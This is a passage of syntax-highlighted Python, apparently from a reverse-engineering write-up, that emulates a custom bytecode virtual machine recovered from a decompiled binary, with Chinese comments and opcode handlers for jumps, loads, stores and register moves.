</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>=</span> <span class=mi>0</span>               <span class=c1># LOWORD(v92)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>=</span> <span class=mi>0</span>               <span class=c1># WORD1(v92)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base2</span> <span class=o>=</span> <span class=mi>0</span>               <span class=c1># WORD2(v92)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=kc>False</span>              <span class=c1># BYTE6(v92) —— 零标志</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span> <span class=o>=</span> <span class=kc>True</span>         <span class=c1># HIBYTE(v92) —— 是否继续跑</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>output</span> <span class=o>=</span> <span class=kc>None</span>           <span class=c1># 0x84 时记一下输出值</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>debug_ok</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>num</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>debug_after_n</span> <span class=o>=</span> <span class=n>debug_after_n</span>
</span></span><span class=line><span class=cl>        <span class=c1># 输入整数写到内存后段</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>input_ints</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>val</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>input_ints</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>idx</span> <span class=o>&gt;=</span> <span class=mi>50</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=n>off</span> <span class=o>=</span> <span class=n>DATA_BASE</span> <span class=o>+</span> <span class=n>idx</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>                <span class=n>struct</span><span class=o>.</span><span class=n>pack_into</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 内存读写辅助</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_u16</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0xFFFF</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>|</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[(</span><span class=n>addr</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write_u8</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>=</span> <span class=n>u8</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_u64</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=n>bs</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>:</span><span class=n>addr</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>bs</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write_u64</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[(</span><span class=n>addr</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>]</span> <span class=o>=</span> <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fetch_u8</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fetch_u16</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>lo</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>hi</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>hi</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>lo</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>step</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>ip0</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span>
</span></span><span class=line><span class=cl>        <span class=n>opcode</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=c1># 方便统一前缀：显示 IP / opcode</span>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>log</span><span class=p>(</span><span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>debug</span> <span class=ow>or</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_ok</span><span class=p>)</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>num</span> <span class=o>&gt;=</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_after_n</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[IP=</span><span class=si>{</span><span class=n>ip0</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> OP=</span><span class=si>{</span><span class=n>opcode</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>] </span><span class=si>{</span><span class=n>msg</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x00: NOP</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x00</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=s2>&#34;NOP&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x01: JMP imm16</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x01</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;JMP 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x02: JNZ imm16  （推测：ZF==0 时跳转）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x02</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;JNZ 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x03: JZ imm16   （推测：ZF==1 时跳转）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x03</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;JZ 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x11: 设置 base0（LOWORD(v92)）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SET base0 = 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x12: 设置 base1（WORD1(v92)）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SET base1 = 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x15: R[reg] = QWORD[mem[base0]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x15</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x15&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDQ R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = [0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>] =&gt; 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x16: R[reg] = imm64</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x16&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>imm</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDI R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x17: R[dst] = R[src]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x17</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x17&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;MOV R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> = R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2> (0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>), ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x18: R[reg] = QWORD[mem[base0 + offset16]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x18</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>off</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x18&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>off</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u64</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=c1># if reg == 0:</span>
</span></span><span class=line><span class=cl>            <span class=c1>#     self.debug_ok = True</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDQ R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = [base0 + 0x</span><span class=si>{</span><span class=n>off</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>] @0x</span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> =&gt; 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x19: QWORD[mem[base0]] = R[reg]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x19</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x19&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;STQ [0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>] = R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> (0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1A: R[dst] = byte[mem[base0 + (u16)R[src]]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1A</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x1A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDB R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2> = [base0 + (u16)R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>] @0x</span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> =&gt; 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
